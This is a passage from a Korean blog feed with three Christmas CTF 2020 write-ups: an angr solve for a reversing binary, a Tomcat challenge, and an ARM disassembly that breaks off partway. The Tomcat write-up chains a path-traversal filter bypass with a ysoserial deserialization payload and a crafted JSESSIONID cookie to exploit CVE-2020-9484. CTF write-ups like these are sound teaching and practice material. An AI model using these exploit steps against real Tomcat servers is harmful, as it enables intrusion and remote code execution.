      <link>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-angrforge/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-angrforge/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;출제-의도&quot;&gt;&lt;a href=&quot;#출제-의도&quot; class=&quot;headerlink&quot; title=&quot;출제 의도&quot;&gt;&lt;/a&gt;출제 의도&lt;/h1&gt;&lt;p&gt;angr를 통해 입력 값을 뽑아내는 것이 의도인 문제였습니다. 이 문제는 여러 번의 수정을 거쳤습니다. </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>angr를 통해 입력 값을 뽑아내는 것이 의도인 문제였습니다. 이 문제는 여러 번의 수정을 거쳤습니다. 원래 이 문제도 arm 환경에서 angr를 돌리는 문제로 낼 예정이었는데 arm에서 제대로 동작하지 않아서 arm은 포기. 그리고 원래 처음에는 c++로 냈었는데 검수 후 수정을 했더니 simulation manager를 돌려도 값이 제대로 나오지 않아서 c로 옮기는 과정에서 연산 몇 개를 뺐습니다..ㅠ</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ file angrforge<span class="hljs-attribute">angrforge</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked,<span class="hljs-attribute">interpreter</span> /lib<span class="hljs-number">64</span>/ld-linux-x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>,<span class="hljs-attribute">BuildID</span>[sha<span class="hljs-number">1</span>]=<span class="hljs-number">1162</span>ed<span class="hljs-number">229</span>a<span class="hljs-number">12133</span>d<span class="hljs-number">07</span>de<span class="hljs-number">26301</span>dad<span class="hljs-number">1</span>ada<span class="hljs-number">34</span>a<span class="hljs-number">9</span>c<span class="hljs-number">3</span>ff, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, stripped</code></pre><p>64bit ELF 파일이며, stripped 되어있습니다.</p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_00103be1</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  undefined8 local_58;  undefined8 local_50;  undefined8 local_48;  undefined8 local_40;  undefined8 local_38;  undefined8 local_30;  undefined8 local_28;  undefined local_20;  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  local_58 = <span class="hljs-number">0</span>;  local_50 = <span class="hljs-number">0</span>;  local_48 = <span class="hljs-number">0</span>;  local_40 = <span class="hljs-number">0</span>;  local_38 = <span class="hljs-number">0</span>;  local_30 = <span class="hljs-number">0</span>;  local_28 = <span class="hljs-number">0</span>;  local_20 = <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;General Angerforge, the Dark Iron responsible for stealing my computer.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;But I\&#x27;m just a programmer.. so Call me my best warrior friend.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If you call my friend, I will give you a good reward.&quot;</span>);  fgets((<span class="hljs-keyword">char</span> *)&amp;local_58,<span class="hljs-number">0x39</span>,<span class="hljs-built_in">stdin</span>);  FUN_00103a48(&amp;local_58);  iVar1 = FUN_001039f7(&amp;local_58);  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OMG, Thank you for your good works :)&quot;</span>);  &#125;  <span class="hljs-keyword">else</span> &#123;    FUN_001039d9();  &#125;  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>    __stack_chk_fail();  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ghidra를 통해 디컴파일을 한 후 main을 확인해보면, <code>0x39(57)</code>만큼의 입력 값을 받아서 <code>FUN_00103a48</code>을 호출하고, <code>FUN_001039f7</code>을 통해 문자열을 체크하는 것을 확인할 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_00103a48</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">size_t</span> sVar1;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  <span class="hljs-keyword">if</span> (sVar1 &lt; (ulong)(<span class="hljs-keyword">long</span>)(<span class="hljs-keyword">int</span>)((DAT_00106014 | DAT_00106010) + <span class="hljs-number">5</span>)) &#123;    FUN_001033e9(param_1);    FUN_00103481(param_1);    FUN_00103519(param_1);    FUN_001035b1(param_1);    FUN_00103649(param_1);    FUN_001036e1(param_1);    FUN_00103779(param_1);    FUN_00103811(param_1);    FUN_001038a9(param_1);    FUN_00103941(param_1);  &#125;  <span class="hljs-keyword">else</span> &#123;    FUN_001011c9(param_1);    FUN_00101396(param_1);    FUN_00101563(param_1);    FUN_00101730(param_1);    FUN_001018fd(param_1);    FUN_00101abf(param_1);    FUN_00101bbf(param_1);    FUN_00101cce(param_1);    FUN_00101dce(param_1);    FUN_00101eee(param_1);    FUN_001022cb(param_1);    FUN_00102589(param_1);    FUN_00102847(param_1);    FUN_00102b05(param_1);    FUN_00102dc3(param_1);    FUN_00102ef9(param_1);    FUN_00103035(param_1);    FUN_00103171(param_1);    FUN_001032ad(param_1);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p><code>FUN_00103a48</code> 함수는 입력 값을 받아서, 길이에 따라서 여러 가지 다른 sub 함수를 수행합니다. 각 sub 함수의 연산은 서로 다른 바이트에 영향을 미치지 않고 함수가 다른 함수를 호출하는 로직도 있어서 상당히 복잡하게 얽혀있습니다. c++에는 곱 연산 같은 것도 넣었는데 c로 급하게 옮기면서 보니 바이트가 증발하더군요..ㅠ <del>시간 부족으로 인한 역 연산 가능 로직</del></p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_001039f7</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> local_c;    local_c = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-number">0x37</span> &lt; local_c) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">if</span> (*(<span class="hljs-keyword">char</span> *)(param_1 + local_c) != (&amp;DAT_00104080)[local_c]) <span class="hljs-keyword">break</span>;    local_c = local_c + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>FUN_001039f7</code>에서는 0x38만큼 <code>DAT_00104080</code>과 값을 비교하여 맞으면 <code>1</code>, 아닐 시 <code>0</code>을 리턴해줍니다.</p><p><code>\n</code>을 제외한 문자열의 길이는 56이고, <code>stdin</code>을 통해 입력 값이 들어가므로 입력 값 56과 <code>stdin</code>을 처리하는 state를 구성하여 simulation manager를 돌리면 값을 구할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripyp = angr.Project(<span class="hljs-string">&#x27;./angrforge&#x27;</span>)flag_chars = [claripy.BVS(<span class="hljs-string">&#x27;flag_%d&#x27;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">56</span>)]flag = claripy.Concat(*flag_chars + [claripy.BVV(<span class="hljs-string">b&#x27;\n&#x27;</span>)])st = p.factory.full_init_state(    stdin = flag,    add_options = angr.options.unicorn,)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag_chars:    st.solver.add(i != <span class="hljs-number">0</span>)    st.solver.add(i != <span class="hljs-number">10</span>)sm = p.factory.simulation_manager(st)sm.run()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sm.deadended:    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;OMG&#x27;</span> <span class="hljs-keyword">in</span> i.posix.dumps(<span class="hljs-number">1</span>):        print(i.posix.dumps(<span class="hljs-number">0</span>))</code></pre><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ python<span class="hljs-number">3</span> solve.py<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">44</span>,<span class="hljs-number">086</span> | cle.loader | The main binary is a position-independent executable.<span class="hljs-attribute">It</span> is being loaded with a base address of <span class="hljs-number">0</span>x<span class="hljs-number">400000</span>.<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">45</span>,<span class="hljs-number">089</span> | angr.simos.simos | stdin is constrained to <span class="hljs-number">57</span> bytes (has_end=True).<span class="hljs-attribute">If</span> you are only providing the first <span class="hljs-number">57</span> bytes instead of the entire stdin,<span class="hljs-attribute">please</span> use stdin=SimFileStream(name=&#x27;stdin&#x27;, content=your_first_n_bytes, has_end=False).<span class="hljs-attribute">b</span>&#x27;XMAS&#123;h<span class="hljs-number">3</span>_<span class="hljs-number">1</span>s_b<span class="hljs-number">1</span>o<span class="hljs-number">0</span>d<span class="hljs-number">3</span>lf_d<span class="hljs-number">3</span>athkni<span class="hljs-number">9</span>ht_wh<span class="hljs-number">0</span>_will_kill_<span class="hljs-number">4</span>ngrf<span class="hljs-number">0</span>rge&#125;\n&#x27;</code></pre><p>Flag : XMAS{h3_1s_b1o0d3lf_d3athkni9ht_wh0_will_kill_4ngrf0rge}</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/reversing/">reversing</category>
      
      <category domain="https://hackyboiz.github.io/tags/angr/">angr</category>
      
      <category domain="https://hackyboiz.github.io/tags/christmas-ctf-2020/">christmas ctf 2020</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-angrforge/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - gift</title>
      <link>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-gift/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-gift/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;출제-의도&quot;&gt;&lt;a href=&quot;#출제-의도&quot; class=&quot;headerlink&quot; title=&quot;출제 의도&quot;&gt;&lt;/a&gt;출제 의도&lt;/h1&gt;&lt;p&gt;올해 초에 발표된 Apache Tomcat CVE-2020-9484를 이용해서 문제를 만들어보고 싶었습니</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>올해 초에 발표된 Apache Tomcat CVE-2020-9484를 이용해서 문제를 만들어보고 싶었습니다. 문제를 만들면서 이 취약점이 있는 서비스를 만들고 싶은데… 만약 이런 사이트가 있었다면 어떤 식으로 취약점에 접근할 수 있을까?라는 생각을 하면서 만들었습니다.</p><p>session이 저장되는 위치와 자신이 올린 파일이 업로드되는 위치를 모두 알아야 하고 또 해당 취약점에 취약한 버전이라는 것도 알아야 해서 local에 있는 파일을 모두 볼 수 있으면 되겠다는 생각을 했습니다. <del>lock과 angrforge의 허술함은 여기에서 왔다.</del></p><p>RCE를 활용해야 한다는 것과 실행할 파일의 위치를 <code>special.jsp</code>에 넣어놨는데 좀 더 잘 보이는 곳에 넣어둘 걸… 하는 생각을 했습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image.jpg"></p><p>제가 웹 알못이다 보니 이런저런 것을 구현할 때 주위의 웹 하는 친구들한테 물어보며 이거 이러이러하게 해서 플래그에 접근하는 건데 게싱이 심하지 않을까? 사람들이 이런 식으로 접근할 수 있을까? 내가 이거 어떻게 하는지 잘 몰라서 이렇게 해봤는데 괜찮을까? 물어보면서 만들었습니다. <del>일단 있는 거 다 해보고 파일은 다 찾아본다며</del></p><p>구현을 도와준다던 놈들은 jsp라고 하니까 다 도망가더군요 하하하… 잡설이 길었습니다.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image0.png"></p><p>메인 화면입니다. 저기 깃발(flag) 모양에 Special gift가 숨겨져 있다!라고 되어있습니다. 이걸 description에 적어놨으면 참 좋았을걸 왜 안 적어놨지? 일단 로그인을 해야 기능을 볼 수 있는 것 같으니 로그인을 해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image1.png"></p><p>로그인을 하면 제공하는 기능을 볼 수 있습니다. 사이트에서 제공하는 기능을 정리하면 아래와 같습니다.</p><ul><li><code>Gift List</code><ul><li>전송한 선물의 리스트를 볼 수 있다.</li><li>file name을 <code>GET</code>을 통해 받는다.</li></ul></li><li><code>Send List</code><ul><li>선물을 전송할 수 있다.</li></ul></li><li><code>Community</code><ul><li>게시판 기능으로 글을 작성할 수 있다.</li></ul></li></ul><p>선물을 전송하면 산타가 그 선물을 준다고 하고 gift list에서 올린 선물 리스트의 내용을 확인할 수 있으니 일단 <code>Send List</code>를 통해 선물을 전송하고 난 후 <code>Gift List</code>에서 어떠한 식으로 확인할 수 있는지를 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image2.png"></p><p>txt 파일과 자신들의 secret한 파일만 올릴 수 있다고 하니 일단 txt 파일을 올려봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image3.png"></p><p>전송이 완료된 후 <code>Gift List</code>를 통해 파일 리스트를 확인하면 <code>&lt;name&gt;</code>‘s gift list라는 제목과 함께 업로드한 파일이 표시가 되고 해당 파일의 내용을 확인할 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image4.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image5.png"></p><p>gift list를 불러올 때 사용되는 <code>&lt;name&gt;</code>은 <code>GET</code>을 통해 불러오는 것으로 추정되므로 해당 인자 값을 수정해봅니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image6.png"></p><p>name을 변경하자 testa’s gift list를 읽어오고 아무것도 출력이 안 되는 것을 볼 수 있습니다.</p><p>name에 따라 다른 디렉터리를 생성하고 해당 폴더에 파일이 올라간다는 가설을 세우고 path traversal이 가능한지 확인을 해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image7.png"></p><p>name에 <code>.</code>을 입력하자 아까 위에서 확인한 두 개의 폴더가 나옵니다. 더 위로 올라가 봅시다.</p><p><code>../</code>나 <code>....//</code>은 필터링이 되어 있어 디렉터리 리스팅이 불가능하지만 <code>..././</code>은 가능합니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image8.png"></p><p>해당 폴더에 진입하면 gift 폴더 안에서 username으로 gift list가 관리되고 있음을 알 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image9.png"></p><p>한 번 더 올라가면 이러한 디렉터리가 보입니다. tomcat의 상위 디렉터리인데 이를 통해 tomcat을 통해 구동되고 있음을 확인할 수 있습니다. 먼저 웹페이지 소스코드 파일은 webapps에 들어있으므로 해당 디렉터리를 들어가서 어떠한 파일이 있는지 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image10.png"></p><p><code>special.jsp</code>라는 파일이 있네요. 메인에서 special gift가 숨겨져 있다고 했으니 해당 jsp를 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image11.png"></p><p><code>special_gift</code> 파일을 찾아서 실행하면 이 디렉터리에서 특별한 선물을 볼 수 있다고 합니다.</p><p>tomcat 디렉터리로 가서 RELEASE-NOTES의 내용을 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image12.png"></p><p>tomcat-8.5.54 버전에서 동작하고 있습니다. 해당 버전은 CVE-2020-9484 버전에 영향을 받는 버전이고 해당 취약점에 영향을 받는지 확인하는 방법은 아래와 같습니다.</p><ul><li>tomcat이 session을 PersistenceManager를 통해 세션을 관리함</li><li>FileStore를 통해 Directory 경로를 지정함</li><li>arbitrary file upload가 가능하며 해당 파일이 어디에 저장되는지 알 수 있음</li></ul><p>현재 arbitrary file upload가 가능하며 파일이 업로드되는 위치도 알 수 있으므로 <code>conf/context.xml</code>을 통해 PersistenceManager를 사용 중인지, 사용 중이라면 FileStore로 Directory를 지정해서 저장하는지, 저장한다면 session이 저장되는 경로는 어딘지 확인합시다.(아까 위에서 sessions 폴더를 본 것 같긴 한데)</p><p><code>detail.jsp?file=..././..././..././conf/context.xml</code>로 접근하면 <code>conf/context.xml</code>의 내용을 확인할 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image13.png"></p><p>PersistentManager, FileStore를 사용하며 session이 저장되는 경로는 <code>/usr/local/tomcat/sessions</code>네요.</p><p>해당 취약점은 session을 deserialize 하면서 일어나는 취약점이므로 gadget도 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image14.png"></p><p><code>/lib</code> 폴더에 <code>groovy-2.3.9.jar</code> 가 존재하는 것을 알 수 있습니다.</p><p>이제 <code>special_gift</code> 파일의 위치를 찾아보면</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image15.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image16.png"></p><p>최상위 경로에 있는 것을 볼 수 있습니다.(이것도 위치를 알려줬어야…ㅠㅠ) 이제 해당 취약점을 활용하여 <code>special_gift</code> 바이너리를 실행하면 <code>/webapps/ROOT</code> 에 flag 파일이 생성될 것입니다.</p><p>그전에 해당 취약점을 활용하는 것이 맞는지 upload.jsp의 내용으로 올릴 수 있는 special file이 session 파일인지 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image17.png"></p><p>허용되어있는 확장자가 <code>.txt</code>와 <code>.session</code>파일임을 알 수 있습니다!</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image18.png"></p><p>흠.. 일단 exploit 과정을 정리하면 다음과 같습니다.</p><ul><li>file이 업로드되는 경로는 <code>tomcat/media/gift/&lt;name&gt;</code>이다.</li><li>sessions이 저장되는 경로는 <code>tomcat/sessions</code>이다.</li><li><code>special.jsp</code> 에 따르면 <code>/special_gift</code>를 실행하면 flag 파일이 생성된다.</li><li><code>/bin/bash -c /special_gift</code>를 수행하면 <code>special_gift</code> 파일이 실행되고 flag를 확인할 수 있다.</li><li>serialize session 생성</li></ul><pre><code class="hljs pgsql">idioth@ubuntu:~$ java -jar ysoserial.jar Groovy1 &quot;/bin/bash -c /special_gift&quot; &gt; exploit.<span class="hljs-keyword">session</span><span class="hljs-built_in">WARNING</span>: An illegal reflective <span class="hljs-keyword">access</span> operation has occurred<span class="hljs-built_in">WARNING</span>: Illegal reflective <span class="hljs-keyword">access</span> <span class="hljs-keyword">by</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span class="hljs-meta">$1</span> (file:/home/idioth/ysoserial.jar) <span class="hljs-keyword">to</span> <span class="hljs-keyword">method</span> java.lang.<span class="hljs-keyword">Object</span>.finalize()<span class="hljs-built_in">WARNING</span>: Please consider reporting this <span class="hljs-keyword">to</span> the maintainers <span class="hljs-keyword">of</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span class="hljs-meta">$1</span><span class="hljs-built_in">WARNING</span>: Use <span class="hljs-comment">--illegal-access=warn to enable warnings of further illegal reflective access operations</span><span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">All</span> illegal <span class="hljs-keyword">access</span> operations will be denied <span class="hljs-keyword">in</span> a future <span class="hljs-keyword">release</span></code></pre><ul><li>해당 session file으로 접근</li></ul><pre><code class="hljs xml">idioth@ubuntu:~$ curl &#x27;http://192.168.48.128/index.jsp&#x27; -H &#x27;Cookie:JSESSIONID=../media/gift/test/exploit&#x27;<span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>HTTP Status 500 – Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">font-family</span>:Tahoma,Arial,sans-serif;&#125; <span class="hljs-selector-tag">h1</span>, <span class="hljs-selector-tag">h2</span>, <span class="hljs-selector-tag">h3</span>, <span class="hljs-selector-tag">b</span> &#123;<span class="hljs-attribute">color</span>:white;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;&#125; <span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">22px</span>;&#125; <span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">16px</span>;&#125; <span class="hljs-selector-tag">h3</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;&#125; <span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">12px</span>;&#125; <span class="hljs-selector-tag">a</span> &#123;<span class="hljs-attribute">color</span>:black;&#125; <span class="hljs-selector-class">.line</span> &#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">1px</span>;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;<span class="hljs-attribute">border</span>:none;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>HTTP Status 500 – Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image19.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image20.png"></p><p>XMAS{0mg_u_f1nd_a_sp3cia1_g1ft!!}</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/tomcat/">tomcat</category>
      
      <category domain="https://hackyboiz.github.io/tags/christmas-ctf-2020/">christmas ctf 2020</category>
      
      <category domain="https://hackyboiz.github.io/tags/web/">web</category>
      
      <category domain="https://hackyboiz.github.io/tags/lfi/">lfi</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2020-9484/">cve-2020-9484</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-gift/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - lock</title>
      <link>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-lock/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-lock/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;출제-의도&quot;&gt;&lt;a href=&quot;#출제-의도&quot; class=&quot;headerlink&quot; title=&quot;출제 의도&quot;&gt;&lt;/a&gt;출제 의도&lt;/h1&gt;&lt;p&gt;baby_crackme를 하나 간단하게 내고 싶었는데 arm으로 내면 어떨까? 싶어서 낸 문제입니다.&lt;/</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>baby_crackme를 하나 간단하게 내고 싶었는데 arm으로 내면 어떨까? 싶어서 낸 문제입니다.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>dump로 파일이 하나 주어지며 vscode나 메모장 등으로 열면 아래와 같은 dump 코드가 나옵니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-lock/image0.png"></p><p>aarch64에서 동작하는 바이너리이며 Input 값을 통해 어떠한 연산을 수행하는 것으로 볼 수 있습니다.</p><pre><code class="hljs llvm"><span class="hljs-number">0000000000000</span><span class="hljs-keyword">c</span><span class="hljs-number">50</span> &lt;main&gt;: <span class="hljs-keyword">c</span><span class="hljs-number">50</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp, #<span class="hljs-number">-32</span>]! <span class="hljs-keyword">c</span><span class="hljs-number">54</span>:   <span class="hljs-number">910003</span>fd    mov <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, sp <span class="hljs-keyword">c</span><span class="hljs-number">58</span>:   d<span class="hljs-number">2800021</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span>                    // <span class="hljs-symbol">#1</span> <span class="hljs-keyword">c</span><span class="hljs-number">5</span><span class="hljs-keyword">c</span>:   d<span class="hljs-number">2800260</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">13</span>                   // <span class="hljs-symbol">#19</span> <span class="hljs-keyword">c</span><span class="hljs-number">60</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">0</span>    bl  <span class="hljs-number">7e0</span> &lt;calloc<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">64</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">68</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">94</span>    bl  ab<span class="hljs-number">8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">51</span>    bl  <span class="hljs-number">9</span>b<span class="hljs-number">0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">70</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">74</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>e    bl  <span class="hljs-number">96</span><span class="hljs-keyword">c</span> &lt;sub_<span class="hljs-number">96</span><span class="hljs-keyword">c</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">78</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">90000000</span>    adrp    <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-number">0</span> &lt;_init<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">760</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">80</span>:   <span class="hljs-number">9138</span>a<span class="hljs-number">000</span>    <span class="hljs-keyword">add</span> <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span>              // <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span> &#x27;<span class="hljs-symbol">%s</span>&#x27; <span class="hljs-keyword">c</span><span class="hljs-number">84</span>:   